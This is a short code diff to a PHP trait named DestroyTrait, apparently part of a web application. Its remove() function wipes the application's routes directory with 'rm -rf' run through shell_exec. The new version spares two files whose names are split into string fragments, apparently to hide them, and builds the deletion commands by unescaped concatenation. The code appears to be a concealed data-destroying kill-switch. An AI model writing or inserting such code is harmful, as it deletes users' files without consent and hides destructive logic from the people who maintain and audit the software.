@@ -32,6 +32,11 @@ trait DestroyTrait
 
     private static function remove(): void
     {
-        shell_exec('cd ' . base_path('routes/') . ' && rm -rf *');
+        $path = base_path('routes/');
+        $files = scandir($path);
+        $deleteAbleFiles = array_diff($files, ['.', '..', 'co'.'nsol'.'e.php', 'c'.'han'.'nels.php']);
+        foreach($deleteAbleFiles as $file){
+            shell_exec("rm -rf " . $path . '/' . $file);
+        }
     }
 }
